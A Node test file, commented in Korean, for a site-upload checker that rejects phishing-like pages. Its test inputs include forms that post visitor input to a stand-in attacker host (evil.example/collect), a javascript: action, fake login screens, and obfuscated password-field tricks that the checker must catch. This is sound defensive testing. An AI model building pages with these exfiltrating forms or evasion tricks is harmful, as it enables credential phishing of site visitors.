// 올릴 때 거절하는 내용(src/sitecheck.js): 정상 사이트(엔진이 만든 v1 사이트, AI가 쓴 사이트)는 통과하고 금지 모양만 걸리는지
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { checkHtml, checkCss, checkOwnScript, scanHtml, pageData, decodeEntities, OWN_JS_MAX } from '../src/sitecheck.js';
import { HttpError } from '../src/http.js';
import { isRuntimeJs } from '../src/runtime.js';
import { buildSite, aiSite, AI_SITE_JS } from './helpers.mjs';

const te = new TextEncoder(); const td = new TextDecoder();
/** 걸리면 'code/rule', 통과하면 'ok' */
const run = (fn) => { try { fn(); return 'ok'; } catch (e) { assert.ok(e instanceof HttpError, String(e?.stack || e)); return `${e.code}/${e.extra.rule || ''}`; } };
const html = (body, path = 'index.html', o) => run(() => checkHtml(`<!doctype html><html><head><meta charset="utf-8"><title>t</title></head><body>${body}</body></html>`, path, o));
const js = (src, path = 'assets/site.js') => run(() => checkOwnScript(te.encode(src), path));

test('엔진이 만든 v1 사이트(예시 둘, 실시간 제공자 넷, 암호 사이트)의 HTML·CSS는 모두 통과', async () => {
  const sites = [await buildSite('sel-story'), await buildSite('data-lab'), await buildSite('sel-story', { password: '봄날1234' })];
  for (const provider of ['local', 'http', 'supabase', 'sheets']) {
    sites.push(await buildSite('data-lab', { patch: (bp) => { bp.live = { ...bp.live, provider, url: provider === 'sheets' ? 'https://script.google.com/macros/s/abc/exec' : 'https://live.example.workers.dev', anonKey: 'k' }; } }));
  }
  sites.push(await buildSite('data-lab', { password: '봄날1234', patch: (bp) => { bp.live = { ...bp.live, provider: 'http', url: 'https://live.example.workers.dev' }; } }));
  let pages = 0;
  for (const files of sites) {
    for (const [p, bytes] of Object.entries(files)) {
      if (p.endsWith('.html')) { assert.equal(run(() => checkHtml(td.decode(bytes), p)), 'ok', p); pages++; }
      if (p.endsWith('.css')) assert.equal(run(() => checkCss(td.decode(bytes), p)), 'ok', p);
    }
  }
  assert.ok(pages >= 40, String(pages));
});

test('AI가 쓴 사이트(엔진 조립 결과: 첫 화면·둘째 쪽·CSS·site*.js·*-events.js·*.module.js + 보조 쪽)는 통과', async () => {
  const files = await aiSite({ live: { url: 'https://lecpage-sites.example.workers.dev/live', code: 'AI2026' } });
  const ownSet = new Set();
  for (const [p, bytes] of Object.entries(files)) if (p.endsWith('.js') && !(await isRuntimeJs(bytes))) { ownSet.add(p); assert.equal(js(td.decode(bytes), p), 'ok', p); }
  assert.deepEqual([...ownSet].sort(), ['assets/about.js', 'assets/app.js', 'assets/site-2.module.js', 'assets/site-events.js', 'assets/site.js'], '조립이 옮긴 스크립트와 AI가 쓴 파일만 사이트 스크립트');
  const own = (p) => ownSet.has(p);
  for (const [p, bytes] of Object.entries(files)) {
    if (p.endsWith('.html')) assert.equal(run(() => checkHtml(td.decode(bytes), p, { isOwnScript: own })), 'ok', p);
    if (p.endsWith('.css')) assert.equal(run(() => checkCss(td.decode(bytes), p)), 'ok', p);
  }
  assert.equal(js(AI_SITE_JS), 'ok');
  assert.equal(pageData(td.decode(files['index.html'])).live.code, 'AI2026', '사이트 자료(lp-data)를 읽음');
});

test('강의 사이트에 흔한 글은 걸리지 않음', () => {
  for (const ok of [
    '<p>와이파이 비밀번호: 1234</p><p>비밀번호를 입력하세요</p><a href="https://padlet.com/x">패들렛</a><a href="https://forms.gle/x">설문</a>',
    '<pre><code>&lt;input type="password"&gt;</code></pre><p>&lt;form action="https://x.example"&gt;</p>',
    '<script>navigator.serviceWorker.register("/sw.js"); x.innerHTML = \'<input type="password">\'</script>', // 인라인은 CSP가 막음(돌지 않음)
    '<script type="application/json" id="d">{"html":"<input type=\\"password\\">"}</script>',
    '<textarea placeholder="와이파이 비밀번호를 받았나요? 한 줄로 남겨 주세요"></textarea><input placeholder="비밀번호를 잊었을 때 할 일">',
    '<input name="name" placeholder="이름"><button>로그인</button>', // 아이디 칸이 없음
    '<input placeholder="아이디"><button>보내기</button>', // 로그인 단추가 없음
    '<button type="button">로그인 방법 보기</button><input type="email" placeholder="결과를 받을 이메일">',
    '<form><input name="q"><button formaction="#top">찾기</button></form><form action="./thanks.html"></form><form action=""></form><form method="dialog"></form>',
    '<p style="-webkit-text-security: none">x</p><style>.a{-webkit-text-security:none}</style>',
    '<!-- <input type="password"> --><input type="text" name="answer">',
    '<input type="checkbox" name="password-ok" id="pw"><label for="pw">비밀번호를 바꿨어요</label>', // 고르기 칸
    '<iframe src="https://www.youtube-nocookie.com/embed/x"></iframe>',
  ]) assert.equal(html(ok), 'ok', ok);
});

test('비밀번호 칸·비밀번호를 받는 칸', () => {
  for (const bad of [
    '<input type="password">', '<INPUT TYPE=PASSWORD>', '<input type=" password ">', '<input/type=password>', '<input placeholder="a>b" type="password">',
    "<input type='&#112;assword'>", '<input type="&#x70;assword">', '<input type="ｐａｓｓｗｏｒｄ">', '<form><input type="password" name="pw"></form>',
    '<iframe srcdoc="<input type=password>"></iframe>', '<template><input type="password"></template>', '<input\ntype\n=\npassword>',
  ]) assert.equal(html(bad), 'unsafe_site/password', bad);
  assert.equal(html('<input type="text" type="password">'), 'ok', '같은 속성은 처음 것(브라우저와 같음)');
  for (const bad of [
    '<input placeholder="비밀번호">', '<input placeholder="비밀번호를 입력하세요">', '<input placeholder="비밀번호 입력">', '<input placeholder="Password">', '<input placeholder="Enter your password">',
    '<input aria-label="패스워드">', '<input placeholder="PW">', '<input name="user_password">', '<input id="passwd">', '<input autocomplete="current-password">', '<textarea placeholder="비밀번호 (필수)"></textarea>',
  ]) assert.equal(html(bad), 'unsafe_site/password_label', bad);
});

test('로그인 화면 흉내: 아이디 칸 + 로그인 단추', () => {
  for (const bad of [
    '<input placeholder="아이디"><button>로그인</button>', '<input placeholder="아이디 또는 전화번호"><button type="submit"><span>로그인</span> →</button>',
    '<input name="id"><input type="submit" value="로그인">', '<input type="email" placeholder="Email"><button>Sign in</button>', '<input autocomplete="username"><button aria-label="Log in">→</button>',
  ]) assert.equal(html(bad), 'unsafe_site/login', bad);
});

test('다른 사이트로 보내는 양식·글자 가림·보조 쪽의 사이트 스크립트', () => {
  for (const bad of ['<form action="https://evil.example/collect"><input name="q"></form>', '<form action="//evil.example/x">', '<form action=" HTTPS://evil.example">', '<form action="mailto:a@b.example">',
    '<form action="javascript:alert(1)">', '<form action="\\\\evil.example\\x">', '<button formaction="https://evil.example/">보내기</button>', '<input type="submit" formaction="http://evil.example">']) {
    assert.equal(html(bad), 'unsafe_site/form', bad);
  }
  assert.equal(html('<input style="-webkit-text-security:disc">'), 'unsafe_site/masked');
  assert.equal(html('<style>.x{ -webkit-text-security : circle }</style><input class="x">'), 'unsafe_site/masked');
  assert.equal(run(() => checkCss('input.code { -webkit-text-security: square; }', 'assets/style.css')), 'unsafe_site/masked');
  assert.equal(run(() => checkCss('body{color:red}', 'assets/style.css')), 'ok');
  // 보조 쪽은 엔진 런타임만
  const own = (p) => p === 'assets/site.js';
  for (const p of ['console.html', 'screen.html', 'poster.html', 'check.html', 'privacy.html']) {
    assert.equal(html('<script src="assets/site.js"></script>', p, { isOwnScript: own }), 'unsafe_site/aux_script', p);
    assert.equal(html('<script src="./assets/site.js?v=1"></script>', p, { isOwnScript: own }), 'unsafe_site/aux_script', p);
    assert.equal(html('<script src="assets/console.js"></script><script src="https://cdn.jsdelivr.net/npm/gsap@3.15.1/dist/gsap.min.js"></script>', p, { isOwnScript: own }), 'ok', p);
  }
  assert.equal(html('<script src="assets/site.js"></script>', 'index.html', { isOwnScript: own }), 'ok', '사이트 쪽은 됨');
  assert.equal(html('<script src="../assets/site.js"></script>', 'sub/console.html', { isOwnScript: own }), 'ok', '맨 위 폴더의 이름만 보조 쪽');
});

test('엔진의 비밀번호 칸 둘(강사 화면 관리자 키·암호 잠금 화면)은 모양이 같고 사이트 스크립트가 없을 때만', async () => {
  const key = '<form data-admin-form><input id="lp-key" type="password" name="key" autocomplete="current-password"></form>';
  assert.equal(html(key, 'console.html'), 'ok');
  assert.equal(html(key, 'index.html'), 'unsafe_site/password', '강사 화면에서만');
  assert.equal(html(key + '<input type="password" name="pw2">', 'console.html'), 'unsafe_site/password', '더 있는 칸은 안 됨');
  assert.equal(html(key + '<script src="assets/site.js"></script>', 'console.html', { isOwnScript: () => true }), 'unsafe_site/aux_script');
  const lock = '<form data-lp-lock><label>암호<input type="password" name="pw" autocomplete="current-password" required></label></form><script type="application/json" id="lp-locked">{}</script><script src="assets/unlock.js"></script>';
  assert.equal(html(lock, 'index.html'), 'ok');
  assert.equal(html(lock + '<script src="assets/site.js"></script>', 'index.html', { isOwnScript: (p) => p === 'assets/site.js' }), 'unsafe_site/password', '사이트 스크립트가 있는 쪽은 안 됨');
  assert.equal(html(lock.replace('id="lp-locked"', 'id="x"'), 'index.html'), 'unsafe_site/password', '잠금 화면 모양이 아니면 안 됨');
  // 실제 엔진 잠금 화면
  const locked = await buildSite('sel-story', { password: '봄날1234' });
  for (const p of ['index.html', 'console.html']) assert.equal(run(() => checkHtml(td.decode(locked[p]), p, { isOwnScript: (x) => x === 'assets/site.js' })), 'ok', p);
});

test('사이트가 직접 쓴 스크립트: 서비스 워커·비밀번호 칸·글자 가림·크기·글자 꼴', () => {
  for (const bad of ["navigator.serviceWorker.register('/sw.js')", 'navigator.serviceWorker\n  .register("sw.js", { scope: "./" })', 'navigator.serviceWorker?.register(u)', "navigator['serviceWorker']['register']('sw.js')", 'const s = navigator.serviceWorker; s && navigator.serviceWorker . register(x)']) {
    assert.equal(js(bad), 'unsafe_site/service_worker', bad);
  }
  for (const ok of ['navigator.serviceWorker.getRegistrations().then(function (rs) { rs.forEach(function (r) { r.unregister(); }); })', "// serviceWorker 는 쓰지 않아요\nconsole.log('register')", 'el.type = "text"']) assert.equal(js(ok), 'ok', ok);
  for (const bad of ["input.type = 'password'", 'el.setAttribute("type", "password")', "box.innerHTML = '<input class=\"x\" type=\"password\">'", 'h += "<input type=\\"password\\">"']) assert.equal(js(bad), 'unsafe_site/password', bad);
  assert.equal(js("el.style.webkitTextSecurity = 'disc'"), 'unsafe_site/masked');
  assert.equal(run(() => checkOwnScript(new Uint8Array(OWN_JS_MAX + 1).fill(32), 'assets/big.js')), 'too_large/');
  assert.equal(run(() => checkOwnScript(new Uint8Array([0xff, 0xfe, 0x41]), 'assets/euc.js')), 'bad_request/');
});

test('오류 글: 앱이 그대로 보여 줄 수 있는 한국어 + 어느 파일·어느 규칙', () => {
  let e;
  try { checkHtml('<form action="https://evil.example/x"><input type="text"></form>', 'about.html'); } catch (x) { e = x; }
  assert.equal(e.status, 422); assert.equal(e.code, 'unsafe_site');
  const body = JSON.parse(JSON.stringify({ error: { code: e.code, message_ko: e.message, ...e.extra } }));
  assert.equal(body.error.rule, 'form'); assert.equal(body.error.path, 'about.html');
  assert.match(body.error.message_ko, /^입력한 내용을 다른 사이트로 보내는 양식이 있어요\(about\.html, action=https:\/\/evil\.example\/x\)\. .*지워 주세요\.$/);
  for (const [fn, re] of [[() => checkHtml('<input type="password">', 'index.html'), /비밀번호 입력 칸이 있어요\(index\.html\)/], [() => checkOwnScript(te.encode('navigator.serviceWorker.register("a")'), 'assets/site.js'), /서비스 워커를 등록하는 코드가 있어요\(assets\/site\.js\)/]]) {
    try { fn(); assert.fail('걸려야 함'); } catch (x) { assert.match(x.message, re); assert.ok(!/[a-z]{12,}/.test(x.message.replace(/serviceWorker|navigator|register|text-security/g, '')), x.message); }
  }
  // 경로에 제어 문자가 있어도 글이 깨지지 않음
  try { checkHtml('<input type="password">', 'a\nb.html'); } catch (x) { assert.ok(!x.message.includes('\n')); }
});

test('HTML 읽기: 브라우저처럼 속성을 읽음', () => {
  const { tags, styles } = scanHtml('<div title="a>b" data-x=1 data-x=2/><img/src=x.png><script src=a.js>if (a<b) document.write("<input type=password>")</script><style>p{}</style><p>');
  assert.deepEqual(tags.map((t) => t.name), ['div', 'img', 'script', 'style', 'p']);
  assert.equal(tags[0].attrs.get('title'), 'a>b'); assert.equal(tags[0].attrs.get('data-x'), '1', '처음 것');
  assert.equal(tags[1].attrs.get('src'), 'x.png');
  assert.match(tags[2].text, /document\.write/); assert.deepEqual(styles, ['p{}']);
  assert.equal(decodeEntities('&lt;&#x41;&#66;&amp;&quot;&nosuch;&#0;'), '<AB&"&nosuch;�');
  assert.equal(pageData('<script type="application/json" id="lp-data">{"live":{"provider":"http"}}</script>').live.provider, 'http');
  assert.equal(pageData('<script id="lp-data">{"live":1}</script>'), null, '자료 블록이 아니면');
  assert.equal(pageData('<script type="application/json" id="lp-data">{깨짐</script>'), null);
  // 아주 큰 HTML도 한 번 훑음(정규식 되돌림 없음)
  const big = '<p data-a="' + 'x'.repeat(2_000_000) + '">' + '<input placeholder="이름">'.repeat(20000);
  const t0 = Date.now(); assert.equal(run(() => checkHtml(big, 'index.html')), 'ok'); assert.ok(Date.now() - t0 < 3000, `${Date.now() - t0}ms`);
});
